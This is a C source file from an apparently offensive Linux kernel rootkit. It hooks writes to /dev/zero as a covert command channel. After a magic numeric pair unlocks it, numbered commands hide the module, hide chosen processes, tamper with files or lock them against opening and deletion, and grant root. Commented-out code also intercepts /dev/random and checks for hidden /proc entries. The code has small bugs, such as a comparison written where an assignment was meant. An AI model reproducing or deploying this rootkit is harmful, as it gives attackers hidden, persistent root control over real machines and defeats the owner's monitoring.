#include "../utils.h"
#include "../file.h"
#include "../rk_vars.h"
#include "../process.h"



static ssize_t (*orig_write_zero)(struct file *file, char __user *buf, size_t count, loff_t *ppos);

int control_zero = 0;
int hidden = 0;
int hide_m = 0;

static ssize_t rk_write_zero(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
{
    char *zero = file->f_path.dentry->d_name.name;
	int ret = 0;

    if(strcmp (zero, "zero") == 0)
    {
		char **a;
		int argc;
		int pid;
		char *name = kzalloc( (count+1)*sizeof(char), GFP_KERNEL);
		if (name == NULL)
        	return orig_write_zero(file, buf, count, ppos);

		if (strncpy_from_user(name, buf, count) > 0) {
			    //printk(KERN_DEBUG "HERE: %s bytes\n", name);
			a = argv_split(GFP_KERNEL, name, &argc);

			int write_zero=0, zero_write=0, cmd=0;
			printk(KERN_DEBUG "ARGC : %d HETE bytes\n", argc);
			printk(KERN_DEBUG "ARGV 0 : %s HETE bytes\n", a[0]);
			if(argc > 1) {
				kstrtoint(a[0], 10, &write_zero);
				kstrtoint(a[1], 10, &zero_write);
				kstrtoint(a[1], 10, &cmd);
				
				if (write_zero == WRITE_ZERO && ZERO_WRITE == zero_write) {
					if (control_zero) {
						control_zero = 0;
					} else {
						control_zero = 1;
					}
					printk(KERN_DEBUG "control ZERO: %d HETE bytes\n", control_zero);

					goto out;
				}
				if(control_zero && write_zero)
				{
					printk(KERN_DEBUG "bds_lkm_ftrgfjgskgsfsksfhjfhjfhlfs om: %d HETE bytes\n", cmd);
					switch (cmd) {
						case 0: 
							#ifndef CONFIG_AUTO_HIDE
							if(hide_m == 0) {
								rk_hide();
								hide_m == 1;
							}
							#endif
							break;
						case 1:
							flip_hidden_flag();
							break;
						case 2:
							kstrtoint(a[2], 10, &pid);
							//printk(KERN_DEBUG "bds_lkm_ftrgfjgskgsfsksfhjfhjfhlfs PID: %d HETE bytes\n", pid);
							#ifdef CONFIG_HIDE_PROCESS
								hide_proc(pid);
							#endif
						break;
						case 3:
							#ifdef CONFIG_FILE_TAMPERING
								file_tampering();
							#endif
							break;
						case 4:
							#ifdef CONFIG_FILE_TAMPERING
								file_no_open_no_write_no_delete();
							#endif
							break;
						case 5:
							#ifdef CONFIG_GIVE_ROOT
								get_root();
							#endif
						default:
							goto origin;
					}
					goto out;
				}

			}

		origin:
			//argv_free(a);
			ret = orig_write_zero(file, buf, count, ppos);
		}
		out:
			argv_free(a);
			kfree(name);
			return 2023;
    }
	else 
	{
		return orig_write_zero(file, buf, count, ppos);
	}

    /*int ret = 0, i, argc, is_num = 1;
	pid_t pid = 0;
	
	

	if (strncpy_from_user(name, filename, PATH_MAX) > 0) {
		if (strncmp(name, "/proc/", 6) == 0) {
			strreplace(name, '/', ' ');

			a = argv_split(GFP_KERNEL, name, &argc);

			for (i = 0; i < strlen(a[1]); i++) {
				if (!isdigit(*a[1]))
					is_num = 0;
			}

			if (is_num) {			
				if (kstrtoint(a[1], 10, &pid) == 0) {
					if (is_proc_invisible(pid))
						ret = 1;
				}
			}

			argv_free(a);
		}
	}

	kfree(name);
	return ret;**/

	/*char *full_path;
	    struct path pathe;

    // Get the path associated with the file
    pathe = file->f_path;

    // Allocate memory for the full path
    full_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!full_path) {
        return ERR_PTR(-ENOMEM);
    }

    // Convert dentry to human-readable path
    d_path(&pathe, full_path, PATH_MAX);


    int bytes_read;


    bytes_read = orig_write_zero(file, buf, count, ppos);
	//char
    //printk(KERN_DEBUG "bds_lkm_ftrace rootkit: intercepted read to /dev/random: %s bytes\n", path);
	printk(KERN_DEBUG "bds_lkm_ftrace rootkit: intercepted read to /dev/random: %s bytes\n", file->f_path.dentry->d_name.name);
	printk(KERN_DEBUG "bds_lkm_ftrace rootkit: intercepted read to /dev/random: %s bytes\n", full_path);



    return bytes_read;*/
}

